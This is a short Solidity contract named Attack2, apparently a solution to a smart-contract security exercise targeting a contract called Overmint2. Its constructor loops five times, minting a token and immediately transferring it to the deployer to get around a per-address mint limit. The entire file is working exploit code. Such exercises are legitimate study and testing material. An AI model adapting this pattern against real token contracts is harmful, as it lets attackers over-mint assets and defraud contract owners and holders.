// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Overmint2} from "./Overmint2.sol";

contract Attack2 {
    constructor(address _victim) {
        for (uint256 i = 0; i < 5; i++) {
            Overmint2(_victim).mint();
            Overmint2(_victim).transferFrom(address(this), msg.sender, Overmint2(_victim).totalSupply());
        }
    }
}
